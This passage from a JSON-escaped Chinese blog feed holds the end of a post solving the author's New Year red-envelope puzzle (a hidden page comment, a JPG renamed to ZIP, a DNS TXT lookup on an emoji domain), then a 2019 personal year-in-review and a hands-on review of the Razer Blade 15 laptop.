src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a 